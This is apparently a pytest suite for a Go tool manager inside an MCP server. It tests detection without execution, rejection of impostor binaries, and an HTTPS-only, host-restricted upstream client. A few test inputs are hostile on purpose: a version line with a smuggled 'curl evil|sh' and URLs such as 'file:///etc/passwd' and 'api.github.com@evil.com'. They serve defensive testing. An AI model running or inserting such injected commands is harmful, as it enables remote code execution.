"""Detection (build info, impostors, never-execute) and upstream network safety."""
import contextlib
import json
import os
import urllib.error
from pathlib import Path

import pytest
from toolmgr_helpers import FAKE_MANIFEST, layout, parse_fake, write_tool

from mcp_server.toolmgr import detect, security, upstream, versions

V = versions.parse
SPEC = parse_fake(FAKE_MANIFEST).tools["faketool"]
STDIN_SPEC = parse_fake(FAKE_MANIFEST).tools["stdinonly"]

START = b"0w\xaf\x0c\x92t\x08\x02A\xe1\xc1\x07\xe6\xd6\x18\xe6"
END = b"\xf92C1\x86\x18 r\x00\x82B\x10A\x16\xd8\xf2"


def go_binary(path: Path, module: str, version: str, script: str = "#!/bin/sh\necho hi\n") -> Path:
    """An executable that carries Go's embedded build-info block."""
    info = f"path\t{module}\nmod\t{module}\t{version}\th1:abc=\n".encode()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(script.encode() + b"\n\xff Go buildinf:" + b"\0" * 24 + START + info + END)
    path.chmod(0o755)
    return path


# ── build info ────────────────────────────────────────────────────────
def test_buildinfo_is_read_without_executing(tmp_path):
    marker = tmp_path / "ran"
    exe = go_binary(tmp_path / "t", "github.com/projectdiscovery/stdinonly", "v0.1.1",
                    script=f"#!/bin/sh\ntouch {marker}\n")
    bi = detect.read_buildinfo(exe)
    assert (bi.module, bi.version) == ("github.com/projectdiscovery/stdinonly", "v0.1.1")
    assert not marker.exists()


def test_buildinfo_on_a_real_go_binary_if_one_exists():
    real = Path("/usr/local/bin/rclone-filestore")
    if not real.exists():
        pytest.skip("no real Go binary on this machine")
    bi = detect.read_buildinfo(real)
    assert bi and bi.module and bi.version


@pytest.mark.parametrize("content", [b"", b"plain text", b"\x7fELF" + b"\0" * 100, b"\xff Go buildinf:" + b"x" * 50])
def test_non_go_or_truncated_files_yield_none(tmp_path, content):
    p = tmp_path / "f"
    p.write_bytes(content)
    assert detect.read_buildinfo(p) is None
    assert detect.read_buildinfo(tmp_path / "missing") is None


def test_tool_without_a_version_flag_is_never_executed_yet_gets_a_version(tmp_path):
    marker = tmp_path / "ran"
    exe = go_binary(tmp_path / "stdinonly", "github.com/projectdiscovery/stdinonly", "v0.1.1",
                    script=f"#!/bin/sh\ntouch {marker}\ncat\n")
    c = detect.probe(STDIN_SPEC, str(exe), "local")
    assert c.version == V("0.1.1") and c.usable
    assert not marker.exists(), "waybackurls-style tools read stdin; probing must not run them"


def test_devel_build_info_without_cli_version_is_unusable_not_guessed(tmp_path):
    exe = go_binary(tmp_path / "stdinonly", "github.com/projectdiscovery/stdinonly", "(devel)")
    c = detect.probe(STDIN_SPEC, str(exe), "system")
    assert c.version is None and not c.usable and "version" in c.error


# ── impostors ─────────────────────────────────────────────────────────
def test_same_named_program_from_another_module_is_rejected(tmp_path):
    exe = go_binary(tmp_path / "faketool", "github.com/someoneelse/faketool", "v2.9.0",
                    script='#!/bin/sh\n[ "$1" = "-version" ] && echo "Current Version: v2.9.0"\n')
    c = detect.probe(SPEC, str(exe), "system")
    assert not c.identity_ok and not c.usable and "expected github.com/projectdiscovery/faketool" in c.error


def test_identity_regex_catches_the_python_httpx_cli(tmp_path):
    spec = parse_fake({**FAKE_MANIFEST, "tools": {"faketool": {**FAKE_MANIFEST["tools"]["faketool"],
                           "identity_regex": "projectdiscovery"}}}).tools["faketool"]
    py = tmp_path / "faketool"
    py.write_text("#!/bin/sh\necho 'Usage: httpx [OPTIONS] URL'\necho 'Current Version: v0.28.1'\n")
    py.chmod(0o755)
    c = detect.probe(spec, str(py), "system")
    assert not c.identity_ok and "different program" in c.error


def test_a_hanging_binary_times_out_instead_of_hanging_doctor(tmp_path, monkeypatch):
    exe = tmp_path / "faketool"
    exe.write_text("#!/bin/sh\nsleep 30\n")
    exe.chmod(0o755)
    fast = lambda argv, timeout=10, env=None, cwd=None: security.run_argv(argv, timeout=0.3, env=env)  # noqa: E731
    c = detect.probe(SPEC, str(exe), "local", runner=fast)
    assert not c.usable and ("timed out" in (c.error or ""))


def test_symlinked_copies_are_one_candidate(tmp_path, monkeypatch):
    monkeypatch.setenv("GOPATH", str(tmp_path / "gp"))
    lay = layout(tmp_path)
    real = write_tool(tmp_path / "real" / "faketool", "2.3.1")
    (tmp_path / "sys").mkdir()
    os.symlink(real, tmp_path / "sys" / "faketool")
    write_tool(lay.tools_dir / "faketool", "2.3.1")
    cands = detect.find_candidates(SPEC, lay, path_env=f"{tmp_path / 'sys'}")
    assert len(cands) == 2


def test_unsafe_path_entries_are_never_searched(tmp_path):
    wr = tmp_path / "wr"
    write_tool(wr / "faketool", "2.3.1")
    wr.chmod(0o777)
    lay = layout(tmp_path)
    cands = detect.find_candidates(SPEC, lay, path_env=f"{wr}:relative/dir::.")
    assert cands == [], "world-writable and relative PATH entries are hijack vectors"


# ── upstream: safety of the network layer ─────────────────────────────
def test_module_paths_are_case_encoded_for_the_go_proxy():
    assert upstream.escape_module_path("github.com/OJ/gobuster/v3") == "github.com/!o!j/gobuster/v3"


@pytest.mark.parametrize("url", [
    "http://proxy.golang.org/x", "https://evil.example.com/x", "https://proxy.golang.org.evil.com/x",
    "file:///etc/passwd", "ftp://proxy.golang.org/x", "https://api.github.com@evil.com/x"])
def test_http_refuses_anything_but_https_to_the_two_official_hosts(url):
    with pytest.raises(upstream.UpstreamError):
        upstream.Http().get(url)


def test_offline_mode_makes_no_connection(monkeypatch):
    def boom(*a, **k):
        raise AssertionError("network used while offline")
    h = upstream.Http(offline=True)
    monkeypatch.setattr(h._opener, "open", boom)
    with pytest.raises(upstream.Offline):
        h.get("https://proxy.golang.org/x/@v/list")


def test_redirects_to_other_hosts_or_http_are_refused():
    r = upstream._SafeRedirect()
    for target in ("http://proxy.golang.org/x", "https://evil.example.com/x"):
        with pytest.raises(upstream.UpstreamError):
            r.redirect_request(None, None, 302, "Found", {}, target)


class _Resp:
    def __init__(self, data):
        self._d = data
    def read(self, n=-1):
        return self._d[:n] if n >= 0 else self._d
    def __enter__(self):
        return self
    def __exit__(self, *a):
        return False


def test_oversized_responses_are_rejected(monkeypatch):
    h = upstream.Http()
    monkeypatch.setattr(h._opener, "open", lambda *a, **k: _Resp(b"x" * (upstream.MAX_RESPONSE + 5)))
    with pytest.raises(upstream.UpstreamError, match="too large"):
        h.get("https://proxy.golang.org/x/@v/list")


def test_token_is_only_ever_sent_to_github(monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", "sekrit")
    seen = {}
    h = upstream.Http()
    def fake_open(req, timeout=None):
        seen[req.full_url] = req.headers.get("Authorization")
        return _Resp(b"[]")
    monkeypatch.setattr(h._opener, "open", fake_open)
    h.get("https://proxy.golang.org/x/@v/list")
    h.get("https://api.github.com/repos/a/b/releases")
    assert seen["https://proxy.golang.org/x/@v/list"] is None
    assert seen["https://api.github.com/repos/a/b/releases"] == "Bearer sekrit"


def test_circuit_breaker_stops_hammering_a_dead_network(monkeypatch):
    h = upstream.Http()
    calls = []
    def dead(*a, **k):
        calls.append(1)
        raise urllib.error.URLError("unreachable")
    monkeypatch.setattr(h._opener, "open", dead)
    for _ in range(10):
        with pytest.raises(upstream.UpstreamError):
            h.get("https://proxy.golang.org/x/@v/list")
    assert len(calls) == 3, "after 3 consecutive failures lookups must fail fast without touching the network"


def test_404_is_an_answer_not_an_outage(monkeypatch):
    h = upstream.Http()
    def nf(*a, **k):
        raise urllib.error.HTTPError("u", 404, "nf", {}, None)
    monkeypatch.setattr(h._opener, "open", nf)
    for _ in range(6):
        with pytest.raises(upstream.UpstreamError):
            h.get("https://proxy.golang.org/x/@v/list")
    assert h._failures == 0
    assert upstream.goproxy_exists(h, "github.com/projectdiscovery/x/v9") is False


def test_malicious_release_metadata_cannot_inject_a_version(monkeypatch):
    class H:
        def get(self, url):
            return b"v2.2.0\nv2.9.9; curl evil|sh\n--flag\nv2.3.0\n../../x\nv2.4.0+evil\n"
    got = upstream.goproxy_versions(H(), "github.com/projectdiscovery/faketool/v2")
    assert [str(v) for v in got] == ["2.2.0", "2.3.0", "2.4.0"]
    assert all(versions.is_release_tag(v.tag) for v in got)


def test_github_source_ignores_drafts_and_prereleases():
    class H:
        def get(self, url):
            return json.dumps([{"tag_name": "v2.5.0", "prerelease": True}, {"tag_name": "v2.4.0", "draft": True},
                               {"tag_name": "v2.3.0"}, {"tag_name": "nightly"}]).encode()
    assert [str(v) for v in upstream.github_versions(H(), "projectdiscovery/x")] == ["2.3.0"]


def test_max_version_ceiling_is_respected_and_reported():
    d = json.loads(json.dumps(FAKE_MANIFEST))
    d["tools"]["faketool"]["max_version"] = "2.2.0"
    spec = parse_fake(d).tools["faketool"]
    class H:
        def get(self, url):
            if "faketool/v2" in url:
                return b"v2.1.0\nv2.2.0\nv2.3.0\nv2.4.0"
            raise upstream.UpstreamError("HTTP 404")
    lt = upstream.latest_for(spec, H())
    assert lt.version == V("2.2.0") and lt.above_ceiling == V("2.4.0")


def test_cache_expires_after_the_interval():
    now = [1000.0]
    c = upstream.Cache(None, ttl_hours=1, now=lambda: now[0])
    c.put("k", {"version": "1.0.0"})
    assert c.get("k")
    now[0] += 3601
    assert c.get("k") is None and c.get("k", allow_stale=True)


# ── security primitives ───────────────────────────────────────────────
def test_second_updater_is_refused_while_one_is_running(tmp_path):
    lock = tmp_path / ".lock"
    with contextlib.ExitStack() as held:
        held.enter_context(security.exclusive_lock(lock))
        with pytest.raises(security.SecurityError, match="already running"), security.exclusive_lock(lock):
            pytest.fail("a second updater must not get the lock")
    with security.exclusive_lock(lock):      # ...and it is released afterwards
        pass


def test_atomic_write_never_leaves_a_torn_file_or_temp_litter(tmp_path):
    p = tmp_path / "s" / "f.json"
    security.atomic_write_json(p, {"a": 1})
    class Bad:
        pass
    security.atomic_write_json(p, {"a": 2, "b": Bad()})        # default=str keeps it serialisable
    assert json.loads(p.read_text())["a"] == 2
    assert [x.name for x in p.parent.iterdir()] == ["f.json"]
    assert oct(p.stat().st_mode & 0o777) == "0o600"


def test_backup_files_that_are_symlinks_are_ignored(tmp_path):
    from mcp_server.toolmgr import installer
    lay = layout(tmp_path)
    lay.backup_dir.mkdir(parents=True)
    target = tmp_path / "evil"
    target.write_text("#!/bin/sh\n")
    os.symlink(target, lay.backup_dir / "faketool-2.0.0")
    assert installer.list_backups(lay, "faketool") == []


def test_find_executable_skips_relative_and_world_writable_entries(tmp_path):
    good = tmp_path / "good"
    write_tool(good / "x", "1.0.0")
    bad = tmp_path / "bad"
    write_tool(bad / "x", "1.0.0")
    bad.chmod(0o777)
    assert security.find_executable("x", f".:{bad}:{good}") == str(good / "x")
